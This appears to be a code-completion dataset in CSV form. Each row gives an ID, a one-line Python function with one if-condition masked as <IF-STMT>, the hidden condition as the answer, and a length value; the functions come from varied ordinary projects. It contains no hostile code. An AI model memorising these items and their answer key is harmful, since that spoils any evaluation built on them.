3520,"def _get_pip_index_urls(sources):<tab>index_urls = []<tab>trusted_hosts = []<tab>for source in sources:<tab><tab>url = source.get(""url"")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>index_urls.append(url)<tab><tab>if source.get(""verify_ssl"", True):<tab><tab><tab>continue<tab><tab>host = six.moves.urllib.parse.urlparse(source[""url""]).hostname<tab><tab>trusted_hosts.append(host)<tab>return index_urls, trusted_hosts",if not url :,129
3521,"def add_aggregation_data(self, payload):<tab>for timestamp, payload_data in payload.items():<tab><tab>if ""interval_aggs"" in payload_data:<tab><tab><tab>self.unwrap_interval_buckets(<tab><tab><tab><tab>timestamp, None, payload_data[""interval_aggs""][""buckets""]<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.unwrap_term_buckets(timestamp, payload_data[""bucket_aggs""][""buckets""])<tab><tab>else:<tab><tab><tab>self.check_matches(timestamp, None, payload_data)","elif ""bucket_aggs"" in payload_data :",136
3522,"def _handle_unverified_signed_presence(self, pres):<tab>verified = self.verify(pres[""status""], pres[""signed""])<tab>if verified.key_id:<tab><tab>if not self.get_keyid(pres[""from""]):<tab><tab><tab>known_keyids = [e[""keyid""] for e in self.gpg.list_keys()]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.gpg.recv_keys(self.key_server, verified.key_id)<tab><tab><tab>self.set_keyid(jid=pres[""from""], keyid=verified.key_id)<tab><tab>self.xmpp.event(""signed_presence"", pres)",if verified . key_id not in known_keyids :,170
3523,"def __init__(self, *args, **kwargs):<tab>""""""Initialize the texture.""""""<tab>super().__init__(*args, **kwargs)<tab>assert_empty_kwargs(**kwargs)<tab>if len(args) == 1:<tab><tab>if isinstance(args[0], vtk.vtkTexture):<tab><tab><tab>self._from_texture(args[0])<tab><tab>elif isinstance(args[0], np.ndarray):<tab><tab><tab>self._from_array(args[0])<tab><tab>elif isinstance(args[0], vtk.vtkImageData):<tab><tab><tab>self._from_image_data(args[0])<tab><tab><IF-STMT><tab><tab><tab>self._from_file(filename=args[0])<tab><tab>else:<tab><tab><tab>raise TypeError(f""Table unable to be made from ({type(args[0])})"")","elif isinstance ( args [ 0 ] , str ) :",200
3524,"def get_manifest_data(manifestpath):<tab>""""""Reads a manifest file, returns a dictionary-like object.""""""<tab>plist = {}<tab>try:<tab><tab>plist = FoundationPlist.readPlist(manifestpath)<tab>except FoundationPlist.NSPropertyListSerializationException:<tab><tab>display.display_error(u""Could not read plist: %s"", manifestpath)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>os.unlink(manifestpath)<tab><tab><tab>except OSError as err:<tab><tab><tab><tab>display.display_error(u""Failed to delete plist: %s"", err)<tab><tab>else:<tab><tab><tab>display.display_error(""plist does not exist."")<tab>return plist",if os . path . exists ( manifestpath ) :,172
3525,"def _get_proxy(self):<tab>url_dissected = url_dissector.findall(self.session[""proxy""])<tab>if url_dissected and len(url_dissected[0]) == 3:<tab><tab>protocol, host, port = url_dissected[0]<tab><tab><IF-STMT><tab><tab><tab>return (socks.PROXY_TYPE_SOCKS5, host, int(port))<tab><tab>if protocol == ""socks4"":<tab><tab><tab>return (socks.PROXY_TYPE_SOCKS4, host, int(port))<tab><tab>if protocol.startswith(""http""):<tab><tab><tab>return (socks.PROXY_TYPE_HTTP, host, int(port))<tab>return None, None, None","if protocol == ""socks5"" :",172
3526,"def nud(self):<tab>self.first = []<tab>comma = False<tab>if self.token.id != "")"":<tab><tab>while 1:<tab><tab><tab>if self.token.id == "")"":<tab><tab><tab><tab>break<tab><tab><tab>self.first.append(self.expression())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>comma = True<tab><tab><tab><tab>self.advance("","")<tab><tab><tab>else:<tab><tab><tab><tab>break<tab>self.advance("")"")<tab>if not self.first or comma:<tab><tab>return self  # tuple<tab>else:<tab><tab>return self.first[0]","if self . token . id == "","" :",146
3527,"def _debug_log(self, text, level):<tab>if text and ""log"" in self.config.sys.debug:<tab><tab>if not text.startswith(self.log_prefix):<tab><tab><tab>text = ""%slog(%s): %s"" % (self.log_prefix, level, text)<tab><tab><IF-STMT><tab><tab><tab>return self.log_parent.log(level, text)<tab><tab>else:<tab><tab><tab>self.term.write(self._fmt_log(text, level=level))",if self . log_parent is not None :,129
3528,"def remove_checker(self, namespace, checker):<tab>for c in pyomo.core.check.ModelCheckRunner._checkers(all=True):<tab><tab>if c._checkerName() == checker:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for i in range(<tab><tab><tab><tab><tab>namespace.checkers[c._checkerPackage()].count(c._checkerName())<tab><tab><tab><tab>):<tab><tab><tab><tab><tab>namespace.checkers[c._checkerPackage()].remove(c._checkerName())","if namespace . checkers . get ( c . _checkerPackage ( ) , None ) is not None :",129
3529,"def check_if_role_exists(self, role_name, parsed_globals):<tab>parameters = {""RoleName"": role_name}<tab>try:<tab><tab>self._call_iam_operation(""GetRole"", parameters, parsed_globals)<tab>except botocore.exceptions.ClientError as e:<tab><tab>role_not_found_code = ""NoSuchEntity""<tab><tab>error_code = e.response.get(""Error"", {}).get(""Code"", """")<tab><tab><IF-STMT><tab><tab><tab># No role error.<tab><tab><tab>return False<tab><tab>else:<tab><tab><tab># Some other error. raise.<tab><tab><tab>raise e<tab>return True",if role_not_found_code == error_code :,158
3530,"def GetClipboardText():<tab>text = """"<tab>if OpenClipboard(0):<tab><tab>hClipMem = GetClipboardData(CF_TEXT)<tab><tab><IF-STMT><tab><tab><tab>GlobalLock.restype = c_char_p<tab><tab><tab>text = GlobalLock(hClipMem)<tab><tab><tab>GlobalUnlock(hClipMem)<tab><tab>CloseClipboard()<tab>return ensure_unicode(text)",if hClipMem :,100
3531,"def test_log_action_class():<tab>v = Mock()<tab>for k, v in amo.LOG_BY_ID.items():<tab><tab><IF-STMT><tab><tab><tab>cls = ""action-"" + v.action_class<tab><tab>else:<tab><tab><tab>cls = """"<tab><tab>assert render(""{{ log_action_class(id) }}"", {""id"": v.id}) == cls",if v . action_class is not None :,100
3532,"def _get_distinct_albumartists(config, session, web_client, query):<tab>logger.debug(f""Getting distinct albumartists: {query}"")<tab>if query:<tab><tab>search_result = _get_search(config, session, web_client, query, album=True)<tab><tab>return {<tab><tab><tab>artist.name<tab><tab><tab>for album in search_result.albums<tab><tab><tab>for artist in album.artists<tab><tab><tab>if album.artists<tab><tab>}<tab>else:<tab><tab>return {<tab><tab><tab>track.album.artist.name<tab><tab><tab>for track in _get_playlist_tracks(config, session)<tab><tab><tab><IF-STMT><tab><tab>}",if track . album and track . album . artist,169
3533,"def _get_commands():<tab>proc = Popen([""react-native"", ""--help""], stdout=PIPE)<tab>should_yield = False<tab>for line in proc.stdout.readlines():<tab><tab>line = line.decode().strip()<tab><tab>if not line:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>should_yield = True<tab><tab><tab>continue<tab><tab>if should_yield:<tab><tab><tab>yield line.split("" "")[0]","if ""Commands:"" in line :",111
3534,"def __call__(self, job):<tab>import tensorboard_logger as tl<tab># id = job.id<tab>budget = job.kwargs[""budget""]<tab># config = job.kwargs['config']<tab>timestamps = job.timestamps<tab>result = job.result<tab>exception = job.exception<tab>time_step = int(timestamps[""finished""] - self.start_time)<tab>if result is not None:<tab><tab>tl.log_value(""BOHB/all_results"", result[""loss""] * -1, time_step)<tab><tab><IF-STMT><tab><tab><tab>self.incumbent = result[""loss""]<tab><tab>tl.log_value(""BOHB/incumbent_results"", self.incumbent * -1, time_step)","if result [ ""loss"" ] < self . incumbent :",193
3535,"def _parse_yum_or_zypper_repositories(output):<tab>repos = []<tab>current_repo = {}<tab>for line in output:<tab><tab>line = line.strip()<tab><tab>if not line or line.startswith(""#""):<tab><tab><tab>continue<tab><tab>if line.startswith(""[""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>repos.append(current_repo)<tab><tab><tab><tab>current_repo = {}<tab><tab><tab>current_repo[""name""] = line[1:-1]<tab><tab>if current_repo and ""="" in line:<tab><tab><tab>key, value = line.split(""="", 1)<tab><tab><tab>current_repo[key] = value<tab>if current_repo:<tab><tab>repos.append(current_repo)<tab>return repos",if current_repo :,179
3536,"def selector():<tab>while True:<tab><tab>rlist, _, _ = select([proc.stdout, proc.stderr], [], [], line_timeout)<tab><tab><IF-STMT><tab><tab><tab>raise ProcessLineTimedOut(<tab><tab><tab><tab>""popen line timeout expired"",<tab><tab><tab><tab>getattr(proc, ""argv"", None),<tab><tab><tab><tab>getattr(proc, ""machine"", None),<tab><tab><tab>)<tab><tab>for stream in rlist:<tab><tab><tab>yield (stream is proc.stderr), decode(stream.readline(linesize))",if not rlist and line_timeout :,127
3537,"def getBranchFromFile():<tab>global _gitdir<tab>branch = None<tab>if _gitdir:<tab><tab>headFile = os.path.join(_gitdir, ""HEAD"")<tab><tab>if os.path.isfile(headFile):<tab><tab><tab>with open(headFile, ""r"", encoding=""utf-8"") as f:<tab><tab><tab><tab>line = f.readline()<tab><tab><tab><tab>if line:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>branch = line.split(""/"")[-1].strip()<tab><tab><tab><tab><tab>else:<tab><tab><tab><tab><tab><tab>branch = ""HEAD""<tab>return branch","if line . startswith ( ""ref"" ) :",151
3538,"def handle(self, msg):<tab>self._mic.send(msg)<tab>for calculate_seed, make_delegate, dict in self._delegate_records:<tab><tab>id = calculate_seed(msg)<tab><tab>if id is None:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>if id not in dict or not dict[id].is_alive():<tab><tab><tab><tab>d = make_delegate((self, msg, id))<tab><tab><tab><tab>d = self._ensure_startable(d)<tab><tab><tab><tab>dict[id] = d<tab><tab><tab><tab>dict[id].start()<tab><tab>else:<tab><tab><tab>d = make_delegate((self, msg, id))<tab><tab><tab>d = self._ensure_startable(d)<tab><tab><tab>d.start()","elif isinstance ( id , collections . Hashable ) :",192
3539,"def _print_items(items, _filter=None):<tab>if _filter:<tab><tab>print(""Displaying items matching filter: %s"" % _filter)<tab>print()<tab>for item in items:<tab><tab>filtered_out = False<tab><tab>for f in _filter.split():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>filtered_out = True<tab><tab>if not filtered_out:<tab><tab><tab>print(item)<tab>print()",if f . lower ( ) not in item . lower ( ) :,113
3540,"def _cbAllRecords(self, results):<tab>ans, auth, add = [], [], []<tab>for res in results:<tab><tab><IF-STMT><tab><tab><tab>ans.extend(res[1][0])<tab><tab><tab>auth.extend(res[1][1])<tab><tab><tab>add.extend(res[1][2])<tab>return ans, auth, add",if res [ 0 ] :,87
3541,"def __status_update(self):<tab>was_active = False<tab>while True:<tab><tab>if self.analytics_instance.active:<tab><tab><tab>was_active = True<tab><tab><tab>msg = ""Active (%s)"" % self.analytics_instance.progress<tab><tab><tab>self.broadcast(msg, ""analytics"", ""analyticsUpdate"")<tab><tab><IF-STMT><tab><tab><tab>self.broadcast(""Inactive"", ""analytics"", ""analyticsUpdate"")<tab><tab><tab>was_active = False<tab><tab>time.sleep(0.2)",if was_active and not self . analytics_instance . active :,133
3542,"def plugin_song(self, song):<tab>for tag in [""album""]:<tab><tab>values = filter(None, map(album_to_sort, song.list(tag)))<tab><tab><IF-STMT><tab><tab><tab>song[tag + ""sort""] = ""\n"".join(values)<tab>for tag in [""artist"", ""albumartist"", ""performer""]:<tab><tab>values = filter(None, map(artist_to_sort, song.list(tag)))<tab><tab>if values and (tag + ""sort"") not in song:<tab><tab><tab>song[tag + ""sort""] = ""\n"".join(values)","if values and ( tag + ""sort"" ) not in song :",149
3543,"def update(h, s):<tab>with lock:<tab><tab>try:<tab><tab><tab>i, c = find_cell(h)<tab><tab>except KeyError:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>c.content = parse(s)<tab><tab><tab>render_from(i, clear_after=True)",if not c . frozen and c . content != s :,86
3544,"def get_parameters(self, names, with_decryption):<tab>result = []<tab>if len(names) > 10:<tab><tab>raise ValidationException(<tab><tab><tab>""1 validation error detected: ""<tab><tab><tab>""Value '[{}]' at 'names' failed to satisfy constraint: ""<tab><tab><tab>""Member must have length less than or equal to 10."".format("", "".join(names))<tab><tab>)<tab>for name in names:<tab><tab><IF-STMT><tab><tab><tab>result.append(self.get_parameter(name, with_decryption))<tab>return result",if name in self . _parameters :,134
3545,"def entered_file_action(self, path):<tab>attempt_copy = True<tab>path = self.try_append_extension(path)<tab>directory = os.path.dirname(path)<tab>if not os.path.exists(directory):<tab><tab>try:<tab><tab><tab>self.create_folder(directory)<tab><tab>except OSError as e:<tab><tab><tab>attempt_copy = False<tab><tab><tab>sublime.error_message(<tab><tab><tab><tab>""Cannot create '"" + path + ""'."" + "" See console for details""<tab><tab><tab>)<tab><tab><tab>print(""Exception: %s '%s'"" % (e.strerror, e.filename))<tab>if attempt_copy:<tab><tab>copy_success, new_file = self._copy_file(path)<tab><tab><IF-STMT><tab><tab><tab>self.open_file(new_file)",if copy_success :,200
3546,"def acquire(self):<tab>""Acquire semaphore by decrementing value using spin-lock algorithm.""<tab>while True:<tab><tab>with self._cache.transact(retry=True):<tab><tab><tab>value = self._cache.get(self._key, default=self._value)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._cache.set(<tab><tab><tab><tab><tab>self._key,<tab><tab><tab><tab><tab>value - 1,<tab><tab><tab><tab><tab>expire=self._expire,<tab><tab><tab><tab><tab>tag=self._tag,<tab><tab><tab><tab>)<tab><tab><tab><tab>return<tab><tab>time.sleep(0.001)",if value > 0 :,153
3547,"def commit(self):<tab>doc = {}<tab>for field, default in self.fields.iteritems():<tab><tab><IF-STMT><tab><tab><tab>value = getattr(self, field)<tab><tab><tab>if field in self.commit_fields or value != default:<tab><tab><tab><tab>doc[field] = getattr(self, field)<tab>with open(self.path, ""w"") as settings_file:<tab><tab>settings_file.write(json.dumps(doc, indent=4))","if hasattr ( self , field ) :",115
3548,"def parse_entrypoints(self, content: str, root=None) -> RootDependency:<tab>if root is None:<tab><tab>root = RootDependency()<tab>entrypoints = []<tab>group = ""console_scripts""<tab>for line in content.split(""\n""):<tab><tab>line = line.strip()<tab><tab><IF-STMT>  # ignore comments<tab><tab><tab>continue<tab><tab>if line[0] == ""["" and line[-1] == ""]"":<tab><tab><tab>group = line[1:-1]<tab><tab>else:<tab><tab><tab>entrypoints.append(EntryPoint.parse(text=line, group=group))<tab>root.entrypoints = tuple(entrypoints)<tab>return root","if not line or line [ 0 ] in ""#;"" :",162
3549,"def request_with_retries(endpoint, timeout=30):<tab>start = time.time()<tab>while True:<tab><tab>try:<tab><tab><tab>return requests.get(""http://127.0.0.1:8000"" + endpoint, timeout=timeout)<tab><tab>except requests.RequestException:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise TimeoutError<tab><tab><tab>time.sleep(0.1)",if time . time ( ) - start > timeout :,101
3550,"def get_expression(self):<tab>""""""Return the expression as a printable string.""""""<tab>l = []<tab>for c in self.content:<tab><tab><IF-STMT>  # only applies to first cell<tab><tab><tab>l.append(c.op)<tab><tab>if c.child is not None:<tab><tab><tab>l.append(""("" + c.child.get_expression() + "")"")<tab><tab>else:<tab><tab><tab>l.append(""%d"" % c.get_value())<tab>return """".join(l)",if c . op is not None :,124
3551,"def nrgen_asc(self):<tab># compute the number of generations present<tab>for generation in range(self.generations_asc - 1, 0, -1):<tab><tab>for p in range(len(self.data[generation])):<tab><tab><tab>(person, parents, child, userdata) = self.data[generation][p]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return generation<tab>return 1",if person :,96
3552,"def check_all_verified(self):<tab>if not self.all_verified:<tab><tab>new_all_verified = not self.lines.filter(verified=False).exists()<tab><tab>if new_all_verified:<tab><tab><tab>self.all_verified = True<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.add_log_entry(<tab><tab><tab><tab><tab>_(""All rows requiring verification have been verified."")<tab><tab><tab><tab>)<tab><tab><tab><tab>self.require_verification = False<tab><tab><tab>self.save()<tab>return self.all_verified",if self . require_verification :,136
3553,"def sort(self, cmp=None, key=None, reverse=False):<tab>""Standard list sort method""<tab>if key:<tab><tab>temp = [(key(v), v) for v in self]<tab><tab>temp.sort(key=lambda x: x[0], reverse=reverse)<tab><tab>self[:] = [v[1] for v in temp]<tab>else:<tab><tab>temp = list(self)<tab><tab><IF-STMT><tab><tab><tab>temp.sort(cmp=cmp, reverse=reverse)<tab><tab>else:<tab><tab><tab>temp.sort(reverse=reverse)<tab><tab>self[:] = temp",if cmp is not None :,146
3554,"def process_formdata(self, valuelist):<tab>if valuelist:<tab><tab>date_str = "" "".join(valuelist)<tab><tab>if not date_str:<tab><tab><tab>self.data = None<tab><tab><tab>raise ValidationError(self.gettext(""Please input a date/time value""))<tab><tab>parse_kwargs = self.parse_kwargs.copy()<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>parse_kwargs[""default""] = self.default()<tab><tab><tab>except TypeError:<tab><tab><tab><tab>parse_kwargs[""default""] = self.default<tab><tab>try:<tab><tab><tab>self.data = parser.parse(date_str, **parse_kwargs)<tab><tab>except ValueError:<tab><tab><tab>self.data = None<tab><tab><tab>raise ValidationError(self.gettext(""Invalid date/time input""))","if ""default"" not in parse_kwargs :",196
3555,"def _expand_dim_shape_func(data_shape, ndim, axis, num_newaxis):<tab>out = output_tensor((ndim + num_newaxis,), ""int64"")<tab>for i in const_range(out.shape[0]):<tab><tab>if i < axis:<tab><tab><tab>out[i] = data_shape[i]<tab><tab><IF-STMT><tab><tab><tab>out[i] = int64(1)<tab><tab>else:<tab><tab><tab>out[i] = data_shape[i - num_newaxis]<tab>return out",elif i < axis + num_newaxis :,133
3556,"def _Return(self, t):<tab>self._fill(""return "")<tab>if t.value:<tab><tab>if isinstance(t.value, Tuple):<tab><tab><tab>text = "", "".join([name.name for name in t.value.asList()])<tab><tab><tab>self._write(text)<tab><tab>else:<tab><tab><tab>self._dispatch(t.value)<tab><tab><IF-STMT><tab><tab><tab>self._write(""; "")",if not self . _do_indent :,106
3557,"def blas_header_version():<tab># Version for the base header<tab>version = (9,)<tab>if detect_macos_sdot_bug():<tab><tab><IF-STMT><tab><tab><tab># Version with fix<tab><tab><tab>version += (1,)<tab><tab>else:<tab><tab><tab># Version with error<tab><tab><tab>version += (2,)<tab>return version",if detect_macos_sdot_bug . fix_works :,97
3558,"def get_queues(self, region: str, attribute_names: []):<tab>sqs_client = AWSFacadeUtils.get_client(""sqs"", self.session, region)<tab>try:<tab><tab>raw_queues = await run_concurrently(sqs_client.list_queues)<tab>except Exception as e:<tab><tab>print_exception(f""Failed to list SQS queues: {e}"")<tab><tab>return []<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return []<tab><tab>queue_urls = raw_queues[""QueueUrls""]<tab><tab>return await map_concurrently(<tab><tab><tab>self._get_queue_attributes,<tab><tab><tab>queue_urls,<tab><tab><tab>region=region,<tab><tab><tab>attribute_names=attribute_names,<tab><tab>)","if ""QueueUrls"" not in raw_queues :",189
3559,"def popupFrameXdiff(job, frame1, frame2, frame3=None):<tab>""""""Opens a frame xdiff.""""""<tab>for command in [""/usr/bin/xxdiff"", ""/usr/local/bin/xdiff""]:<tab><tab>if os.path.isfile(command):<tab><tab><tab>for frame in [frame1, frame2, frame3]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>command += "" --title1 %s %s"" % (<tab><tab><tab><tab><tab><tab>frame.data.name,<tab><tab><tab><tab><tab><tab>getFrameLogFile(job, frame),<tab><tab><tab><tab><tab>)<tab><tab><tab>shellOut(command)",if frame :,154
3560,"def wrap(*args, **kwargs):<tab>callargs = getcallargs(fun, *args, **kwargs)<tab>if callargs[""sock""] is None:<tab><tab># This variable is used only to debug leak in tests<tab><tab>COUNT[""count""] += 1<tab><tab>with IPSet() as sock:<tab><tab><tab>callargs[""sock""] = sock<tab><tab><tab># We must pop kwargs here, else the function will receive<tab><tab><tab># a dict of dict<tab><tab><tab><IF-STMT><tab><tab><tab><tab>callargs.update(callargs.pop(""kwargs""))<tab><tab><tab>return fun(**callargs)  # pylint:disable=star-args<tab>return fun(*args, **kwargs)","if ""kwargs"" in callargs :",164
3561,"def set_multi(self, value):<tab>del self[atype]<tab>for addr in value:<tab><tab># Support assigning dictionary versions of addresses<tab><tab># instead of full Address objects.<tab><tab>if not isinstance(addr, Address):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>addr[""type""] = atype<tab><tab><tab>elif ""atype"" in addr and ""type"" not in addr:<tab><tab><tab><tab>addr[""type""] = addr[""atype""]<tab><tab><tab>addrObj = Address()<tab><tab><tab>addrObj.values = addr<tab><tab><tab>addr = addrObj<tab><tab>self.append(addr)","if atype != ""all"" :",146
3562,"def test_connection(self, data=None, raise_alert=False):<tab>try:<tab><tab>result = self._test_connection(self.connection_config(data))<tab>except CallError as e:<tab><tab>result = {""error"": True, ""exception"": str(e)}<tab>if result[""error""]:<tab><tab><IF-STMT><tab><tab><tab>config = self.middleware.call_sync(""kmip.config"")<tab><tab><tab>self.middleware.call_sync(<tab><tab><tab><tab>""alert.oneshot_create"",<tab><tab><tab><tab>""KMIPConnectionFailed"",<tab><tab><tab><tab>{""server"": config[""server""], ""error"": result[""exception""]},<tab><tab><tab>)<tab><tab>return False<tab>else:<tab><tab>return True",if raise_alert :,174
3563,"def test05_geometries(self):<tab>""Testing Geometries from Data Source Features.""<tab>for source in ds_list:<tab><tab>ds = DataSource(source.ds)<tab><tab># Incrementing through each layer and feature.<tab><tab>for layer in ds:<tab><tab><tab>for feat in layer:<tab><tab><tab><tab>g = feat.geom<tab><tab><tab><tab># Making sure we get the right Geometry name & type<tab><tab><tab><tab>self.assertEqual(source.geom, g.geom_name)<tab><tab><tab><tab>self.assertEqual(source.gtype, g.geom_type)<tab><tab><tab><tab># Making sure the SpatialReference is as expected.<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.assertEqual(source.srs_wkt, g.srs.wkt)","if hasattr ( source , ""srs_wkt"" ) :",197
3564,"def __walk_dir_tree(self, dirname):<tab>dir_list = []<tab>self.__logger.debug(""__walk_dir_tree. START dir=%s"", dirname)<tab>for f in os.listdir(dirname):<tab><tab>current = os.path.join(dirname, f)<tab><tab>if os.path.isfile(current) and f.endswith(""py""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._load_py_from_file(current)<tab><tab><tab>dir_list.append(current)<tab><tab>elif os.path.isdir(current):<tab><tab><tab>ret = self.__walk_dir_tree(current)<tab><tab><tab>if ret:<tab><tab><tab><tab>dir_list.append((f, ret))<tab>return dir_list",if self . module_registrant :,184
3565,"def setData(self, data=None):<tab># update the data for the grid<tab>for nRow in range(self.nRows):<tab><tab>for nCol in range(self.nCols):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.SetCellValue(nRow, nCol, ""%f"" % data[nRow, nCol])<tab><tab><tab>else:<tab><tab><tab><tab>self.SetCellValue(nRow, nCol, ""0.000"")<tab>self.AutoSize()",if data is not None and nRow < data . shape [ 0 ] and nCol < data . shape [ 1 ] :,141
3566,"def __init__(self, *args, **kwargs):<tab>""""""Initialize the texture.""""""<tab>super().__init__(*args, **kwargs)<tab>assert_empty_kwargs(**kwargs)<tab>if len(args) == 1:<tab><tab>if isinstance(args[0], vtk.vtkTexture):<tab><tab><tab>self._from_texture(args[0])<tab><tab>elif isinstance(args[0], np.ndarray):<tab><tab><tab>self._from_array(args[0])<tab><tab><IF-STMT><tab><tab><tab>self._from_image_data(args[0])<tab><tab>elif isinstance(args[0], str):<tab><tab><tab>self._from_file(filename=args[0])<tab><tab>else:<tab><tab><tab>raise TypeError(f""Table unable to be made from ({type(args[0])})"")","elif isinstance ( args [ 0 ] , vtk . vtkImageData ) :",200
3567,"def delete_old_post_save(<tab>sender, instance, raw, created, update_fields, using, **kwargs):<tab>""""""Post_save on all models with file fields, deletes old files""""""<tab>if raw or created:<tab><tab>return<tab>for field_name, new_file in cache.fields_for_model_instance(instance):<tab><tab><IF-STMT><tab><tab><tab>old_file = cache.get_field_attr(instance, field_name)<tab><tab><tab>if old_file != new_file:<tab><tab><tab><tab>delete_file(instance, field_name, old_file, using)<tab># reset cache<tab>cache.make_cleanup_cache(instance)",if update_fields is None or field_name in update_fields :,171
3568,"def do_refresh(self):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>service_status = agent_status()<tab><tab><tab>self.properties.service_status_label.setText(<tab><tab><tab><tab>HUMAN_SERVICE_STATUS[service_status]<tab><tab><tab>)<tab>finally:<tab><tab>QTimer.singleShot(REFRESH_PERIOD, self.do_refresh)",if self . isVisible ( ) :,92
3569,"def json_dumps(data):<tab>""""""Return data in nicely formatted json.""""""<tab>try:<tab><tab>return json.dumps(<tab><tab><tab>data,<tab><tab><tab>indent=1,<tab><tab><tab>sort_keys=True,<tab><tab><tab>separators=("","", "": ""),<tab><tab><tab>default=json_serialize_default,<tab><tab>)<tab>except UnicodeDecodeError:<tab><tab><IF-STMT><tab><tab><tab>data = json_preserialize_binary(data)<tab><tab><tab>return json.dumps(data)<tab><tab>raise","if sys . version_info [ : 2 ] == ( 2 , 7 ) :",132
3570,"def __init__(self, aList):<tab>for element in aList:<tab><tab>if len(element) > 0:<tab><tab><tab>if element.tag == element[0].tag:<tab><tab><tab><tab>self.append(ListParser(element))<tab><tab><tab>else:<tab><tab><tab><tab>self.append(DictParser(element))<tab><tab>elif element.text:<tab><tab><tab>text = element.text.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.append(text)",if text :,116
3571,"def __init__(self, token):<tab>self._convert_to_ascii = False<tab>self._find = None<tab>if token.search is None:<tab><tab>return<tab>flags = 0<tab>self._match_this_many = 1<tab>if token.options:<tab><tab>if ""g"" in token.options:<tab><tab><tab>self._match_this_many = 0<tab><tab>if ""i"" in token.options:<tab><tab><tab>flags |= re.IGNORECASE<tab><tab><IF-STMT><tab><tab><tab>self._convert_to_ascii = True<tab>self._find = re.compile(token.search, flags | re.DOTALL)<tab>self._replace = _CleverReplace(token.replace)","if ""a"" in token . options :",170
3572,"def get_next(self):<tab>if self.current > self.maximum:<tab><tab>raise StopIteration<tab>else:<tab><tab><IF-STMT><tab><tab><tab>payl = ""%0"" + str(self.width) + ""d""<tab><tab><tab>payl = payl % (self.current)<tab><tab>else:<tab><tab><tab>payl = str(self.current)<tab><tab>self.current += 1<tab><tab>return payl",if self . width :,104
3573,"def any(self, provider_name):<tab>result = authomatic.login(Webapp2Adapter(self), provider_name)<tab>if result:<tab><tab>apis = []<tab><tab><IF-STMT><tab><tab><tab>result.user.update()<tab><tab><tab>if result.user.credentials:<tab><tab><tab><tab>apis = config.config.get(provider_name, {}).get(""_apis"", {})<tab><tab>nice_provider_name = (<tab><tab><tab>config.config.get(provider_name, {}).get(""_name"")<tab><tab><tab>or provider_name.capitalize()<tab><tab>)<tab><tab>render(<tab><tab><tab>self,<tab><tab><tab>result,<tab><tab><tab>result.popup_js(custom=dict(apis=apis, provider_name=nice_provider_name)),<tab><tab>)",if result . user :,186
3574,"def _get_lun_id(self, volume, target_name):<tab>""""""Get lun id of the voluem in a target.""""""<tab>pool = volume_utils.extract_host(volume.host, level=""pool"")<tab>volume_name = self._trans_name_down(volume.name)<tab>lun_id = None<tab>luns = self._get_lun_list(target_name)<tab>for lun in luns:<tab><tab>mappinglvm = lun.get(""mappingLvm"")<tab><tab>lun_name = mappinglvm.replace(r""%s/"" % pool, """")<tab><tab><IF-STMT><tab><tab><tab>lun_id = lun.get(""id"")<tab>return lun_id",if lun_name == volume_name :,183
3575,"def save_settings(self, settings):<tab>for setting in self.settings:<tab><tab>setting_obj = settings[setting]<tab><tab>new_value = self.cleaned_data.get(setting)<tab><tab><IF-STMT><tab><tab><tab>if new_value and new_value != self.initial.get(setting):<tab><tab><tab><tab>self.save_image(setting_obj, new_value)<tab><tab><tab>elif self.cleaned_data.get(""%s_delete"" % setting):<tab><tab><tab><tab>self.delete_image(setting_obj)<tab><tab>else:<tab><tab><tab>self.save_setting(setting_obj, new_value)","if setting_obj . python_type == ""image"" :",160
3576,"def setup_with_driver(self):<tab>if not self.__class__.shared_state_initialized:<tab><tab>try:<tab><tab><tab>self.setup_shared_state()<tab><tab><tab>self.logout_if_needed()<tab><tab>except Exception:<tab><tab><tab>self.__class__.shared_state_in_error = True<tab><tab><tab>raise<tab><tab>finally:<tab><tab><tab>self.__class__.shared_state_initialized = True<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise unittest.SkipTest(<tab><tab><tab><tab>""Skipping test, failed to initialize state previously.""<tab><tab><tab>)",if self . __class__ . shared_state_in_error :,150
3577,"def _get_replication_type_param(k, v):<tab>words = v.split()<tab>if len(words) == 2 and words[0] == ""<in>"":<tab><tab>REPLICA_SYNC_TYPES = {<tab><tab><tab>""sync"": constants.REPLICA_SYNC_MODEL,<tab><tab><tab>""async"": constants.REPLICA_ASYNC_MODEL,<tab><tab>}<tab><tab>sync_type = words[1].lower()<tab><tab><IF-STMT><tab><tab><tab>return REPLICA_SYNC_TYPES[sync_type]<tab>msg = _(<tab><tab>""replication_type spec must be specified as ""<tab><tab>""replication_type='<in> sync' or '<in> async'.""<tab>)<tab>LOG.error(msg)<tab>raise exception.InvalidInput(reason=msg)",if sync_type in REPLICA_SYNC_TYPES :,200
3578,"def request(self, host, handler, request_body, verbose=False):<tab># retry request once if cached connection has gone cold<tab>for i in (0, 1):<tab><tab>try:<tab><tab><tab>return self.single_request(host, handler, request_body, verbose)<tab><tab>except socket.error as e:<tab><tab><tab>if i or e.errno not in (errno.ECONNRESET, errno.ECONNABORTED, errno.EPIPE):<tab><tab><tab><tab>raise<tab><tab>except http_client.BadStatusLine:  # close after we sent request<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise",if i :,147
